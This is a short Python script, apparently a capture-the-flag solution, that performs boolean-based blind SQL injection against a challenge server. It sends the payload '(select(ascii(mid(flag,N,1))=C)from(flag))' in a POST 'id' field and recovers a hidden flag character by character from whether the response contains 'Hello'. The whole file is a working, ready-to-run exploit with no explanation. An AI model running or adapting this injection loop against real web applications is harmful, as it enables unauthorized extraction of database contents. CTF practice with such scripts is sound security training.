import requests
import string

if __name__ == '__main__':
    flag = ''
    url = "http://316fe5f3-5a92-4ece-84c5-910ff9e19655.node4.buuoj.cn/index.php"
    strings = string.printable
    for num in range(1, 60):
        for i in strings:
            payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num, ord(i))  # ord('a')=97
            post_data = {"id": payload}
            res = requests.post(url=url, data=post_data)
            if 'Hello' in res.text:
                print(i,end="")
            else:
                continue
